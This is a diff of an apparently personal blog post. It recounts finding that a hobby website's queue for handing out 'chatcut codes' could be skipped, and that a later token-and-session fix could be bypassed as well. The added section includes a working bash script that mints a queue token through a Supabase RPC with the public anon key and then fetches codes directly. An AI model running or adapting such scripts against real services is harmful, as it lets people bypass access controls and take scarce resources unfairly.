@@ -10,7 +10,39 @@ we start at me scrolling through twitter and i see someone vibecoded a website f
 after my discovery, i decided to contact the owner of the website on twitter:
 ![post2](src/images/twitter2.png)
 
-in summary: i discovered a vulnerability in the vibecoded chatcut codes website that allowed me to retrieve chatcut codes without waiting in line via curl. i contacted the owner of the website on twitter and reported the issue. the owner resolved the issue within three hours.
+UNTIL... i found out that the owner of the website introduced the requirement of tokens and uuids (for a valid session) but i found out that can be easily bypassed with a small python script. first, we'll get into how i found out about this. remember when the owner of the website "fixed the issue"? yeah, i looked at the new swagger api documentation and went straight to trying to find a workaround for the new patch to the issue i found earlier. after some trial and error, i managed to get five codes but not all the available ones the website reported, but they changed in large intervals, still a great discovery. now that you know about this, here is the script i came up with:
+
+```bash
+PROJECT="<<>>.supabase.co"
+ANON_KEY="<<>>"
+
+# session id
+if command -v uuidgen >/dev/null 2>&1; then
+  SID="$(uuidgen)"
+else
+  SID="$(python -c 'import uuid;print(uuid.uuid4())')"
+fi
+
+# generate queue token
+TOKEN_JSON=$(curl -s -X POST "https://${PROJECT}/rest/v1/rpc/generate_queue_token" \
+  -H "apikey: ${ANON_KEY}" \
+  -H "Authorization: Bearer ${ANON_KEY}" \
+  -H "Content-Type: application/json" \
+  -d "{\"p_session_id\":\"${SID}\"}")
+
+# extract just the token value
+TOKEN=$(echo "$TOKEN_JSON" | tr -d '"')
+
+# sanity check
+echo "Token: $TOKEN"
+
+# fetch codes
+curl -s -X POST "https://${PROJECT}/rest/v1/rpc/get_codes_with_token" \
+  -H "apikey: ${ANON_KEY}" \
+  -H "Authorization: Bearer ${ANON_KEY}" \
+  -H "Content-Type: application/json" \
+  -d "{\"p_token\":\"${TOKEN}\"}"
+```
 
 timeline for this:
 
